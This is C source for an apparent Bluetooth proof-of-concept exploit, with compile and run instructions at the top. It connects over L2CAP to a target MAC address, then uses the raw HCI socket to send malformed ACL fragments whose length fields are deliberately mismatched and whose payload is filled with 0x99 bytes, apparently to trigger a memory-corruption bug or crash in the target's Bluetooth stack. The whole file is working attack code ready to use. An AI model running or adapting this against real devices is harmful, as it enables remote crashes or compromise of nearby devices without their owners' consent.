/*
 * gcc -lbluetooth poc.c -o poc
 * sudo ./poc MAC_ADDR
 */


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <errno.h>
#include <unistd.h>
#include <sys/uio.h>


int hci_send_acl_data(int hci_socket, uint16_t hci_handle, uint8_t *data, uint16_t data_length,uint16_t, uint16_t);

int main(int argc,char **argv) {
    bdaddr_t dst_addr;
    if (argc != 2){
    	printf("usage: ./poc MAC_ADDR");
	exit(1);
    }
    str2ba(argv[1], &dst_addr);
    struct hci_dev_info di;

    // Get HCI Socket
    printf("\nCreating HCI socket...\n");
    int hci_device_id = hci_get_route(NULL);
    int hci_socket = hci_open_dev(hci_device_id);
    if(hci_devinfo(hci_device_id,&di)< 0){
    	perror("devinfo");
	exit(1);
    }
    uint16_t hci_handle;
    // -------- L2CAP Socket --------
    // local addr
    struct l2cap_conninfo l2_conninfo;
    int l2_sock;
    struct sockaddr_l2 laddr, raddr;
    laddr.l2_family = AF_BLUETOOTH;
    laddr.l2_bdaddr = di.bdaddr;
    laddr.l2_psm = htobs(0x1001);
    laddr.l2_cid = htobs(0x0040);

    // remote addr
    memset(&raddr, 0, sizeof(raddr));
    raddr.l2_family = AF_BLUETOOTH;
    raddr.l2_bdaddr = dst_addr;

    // create socket 
    printf("\nCreating l2cap socket...\n");
    if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0){
    	perror("create l2cap socket");
	exit(1);
    }
    // bind and connect
    bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr));
    if(connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr))<0){
    	perror("connect");
	exit(1);
    }
    socklen_t l2_conninfolen = sizeof(l2_conninfo);
    getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen);
    hci_handle = l2_conninfo.hci_handle;
    printf("fuck%d", hci_handle);

    // -------- L2CAP Socket --------

    // HCI Connect
    printf("\nCreating a HCI BLE connection...\n");
    printf("\nPrepare to send packet\n");
    uint16_t datalen = 33;
    uint16_t _bs_l2cap_len = htobs(datalen);
    uint16_t _bs_cid = htobs(0x0001);
    uint8_t packet[4 + datalen + 0x1000];
    memcpy(&packet[0],&_bs_l2cap_len,2);
    memcpy(&packet[2],&_bs_cid,2);
    memset(&packet[4], 0x99, datalen+0x1000);
    int fl = 36;
    int i =0 ;
    hci_send_acl_data(hci_socket, hci_handle, &packet[i] , fl,0x2, fl ); 
    i+=fl;
    printf("\nSent fisrt packet\n");
    hci_send_acl_data(hci_socket, hci_handle, &packet[i] , 300,0x1, 300); 

    printf("\nClosing HCI socket...\n");
    close(hci_socket);
    printf("\nClosing l2cap socket...\n");
    close(l2_sock);
    return 0;
}

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, uint8_t *data, uint16_t data_length, uint16_t PBflag, uint16_t dlen){
    uint8_t type = HCI_ACLDATA_PKT;
    uint16_t BCflag = 0x0000;               // Broadcast flag
    //uint16_t PBflag = 0x0002;               // Packet Boundary flag
    uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;       
    hci_acl_hdr hd;
    hd.handle = htobs(acl_handle_pack(hci_handle, flags));  
    //hd.dlen = (data_length);
    hd.dlen = dlen;
    struct iovec iv[3];
    int ivn = 3;

    iv[0].iov_base = &type;                 // Type of operation
    iv[0].iov_len = 1;                      // Size of ACL operation flag
    iv[1].iov_base = &hd;                   // Handle info + flags
    iv[1].iov_len = HCI_ACL_HDR_SIZE;       // L2CAP header length + data length
    iv[2].iov_base = data;                  // L2CAP header + data
    iv[2].iov_len = (data_length);          // L2CAP header length + data length

    while (writev(hci_socket, iv, ivn) < 0) {
        if (errno == EAGAIN || errno == EINTR)
            continue;
	perror("writev");
        return -1;
    }
    return 0;
}

